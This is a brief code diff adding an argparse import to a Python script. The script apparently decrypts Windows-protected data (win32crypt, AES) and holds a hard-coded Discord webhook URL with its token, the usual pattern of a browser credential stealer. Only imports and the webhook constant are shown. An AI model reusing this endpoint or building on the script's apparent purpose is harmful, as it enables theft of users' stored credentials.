@@ -14,6 +14,7 @@ from datetime import datetime
 from pathlib import Path
 import win32crypt
 from Crypto.Cipher import AES
+import argparse
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1400281612800888923/fHNKZfvDpO7d-VjmHUQuEyqumi_20ue2YQQxW_oVrBcxpxxP7Lq_m6V_q2QGOSsqUsC1"
 
